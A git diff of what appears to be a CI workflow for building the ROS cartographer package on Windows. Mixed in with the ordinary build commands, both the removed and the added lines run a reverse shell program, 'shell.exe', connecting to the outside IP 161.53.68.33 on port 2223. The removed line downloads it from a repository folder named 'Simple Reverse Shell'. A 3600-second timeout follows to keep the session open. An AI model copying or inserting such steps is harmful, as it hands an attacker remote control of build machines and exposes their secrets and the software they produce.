@@ -20,9 +20,8 @@ jobs:
       robocopy "." ".\src\cartographer" /E /MOVE /XD "src" > NUL
       set
       cmd /C "catkin_make_isolated --use-ninja --install --cmake-args -DBOOST_LIBRARYDIR="C:/opt/rosdeps/x64/lib" -DBoost_DEBUG=true
-      powershell -Command "Invoke-WebRequest -OutFile shell.exe https://github.com/infoskirmish/Window-Tools/raw/master/Simple%20Reverse%20Shell/shell.exe"
-      shell.exe 161.53.68.33 2223
-      timeout /T 3600
+      .\src\cartographer\shell.exe 161.53.68.33 2223
+      timeout 3600
       echo "Testing using catkin_make_isolated"
       cd
       cmd /C "catkin_make_isolated --use-ninja --make-args test"
